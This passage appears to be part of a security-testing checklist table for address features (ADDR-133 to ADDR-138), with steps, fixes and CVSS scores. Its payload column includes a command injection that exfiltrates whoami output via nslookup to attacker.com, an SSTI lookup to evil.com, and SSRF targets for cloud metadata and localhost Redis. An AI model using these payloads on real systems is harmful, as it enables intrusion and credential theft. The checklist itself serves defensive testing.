| ADDR-133 | Right-to-Left Override Attack in Address | Input Validation (WSTG-INPV-01) | International Address Support | 1. Insert Unicode Right-to-Left Override character (U+202E) in address fields.<br>2. Check if the displayed address is visually different from what is stored.<br>3. Test for address spoofing. | Application must strip or neutralize bidirectional control characters in address fields to prevent display manipulation. | <code>street=123 [U+202E]tsriF eniL (displays as 123 Line First);name=[U+202E]moc.live@tset</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-20; [XSS kit](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ADDR-134 | Address Data Exfiltration via DNS | Exfiltration (WSTG-INPV-19) | Address Book Management | 1. If SSTI or injection exists in address fields attempt DNS-based data exfiltration.<br>2. Use address fields to trigger DNS lookups to attacker-controlled domain.<br>3. Monitor DNS logs. | Application must prevent injection attacks that could enable DNS-based data exfiltration from address processing. | <code>street=${IFS}nslookup${IFS}$(whoami).attacker.com or street={{request.META.HTTP_HOST}}.evil.com</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator;Custom DNS | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ADDR-135 | Address Webhook Manipulation | SSRF (WSTG-INPV-19) | Add / Edit / Delete Address | 1. If address changes trigger webhooks check if the webhook URL is configurable.<br>2. Set webhook to internal service.<br>3. Check for SSRF through address change notifications. | Application must validate webhook URLs and restrict them to whitelisted external endpoints only. | <code>Set address_change_webhook=http://169.254.169.254/latest/meta-data/ or http://localhost:6379/</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| ADDR-136 | Default Address Cache Inconsistency | Business Logic (WSTG-BUSL-02) | Default Address Selection | 1. Set a default address.<br>2. Delete the default address.<br>3. Check if the cache still returns the deleted address as default.<br>4. Place an order and check which address is used. | Application must invalidate caches when the default address is changed or deleted to prevent stale data usage. | <code>Delete default address then immediately place order checking if cached default address is still used</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ADDR-137 | Address Validation Replay Attack | Session Management (WSTG-SESS-03) | Address Validation | 1. Capture a successful address validation response.<br>2. Change the address to an invalid one.<br>3. Replay the old validation success response.<br>4. Check if the application accepts the invalid address. | Application must tie validation results to the specific address validated and re-validate on submission. | <code>Replay old validation_token or validation_result for a new invalid address submission</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ADDR-138 | WebSocket Location Tracking Abuse | Information Disclosure (WSTG-INFO-05) | Geolocation / Auto-detect | 1. If geolocation uses WebSocket for real-time tracking check for authentication on the WebSocket connection.<br>2. Connect without auth.<br>3. Check for location data leakage. | Application must authenticate and authorize WebSocket connections for location tracking just as with REST endpoints. | <code>Connect to ws://target.com/location-ws without authentication token and monitor for location broadcasts</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;OWASP ZAP | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
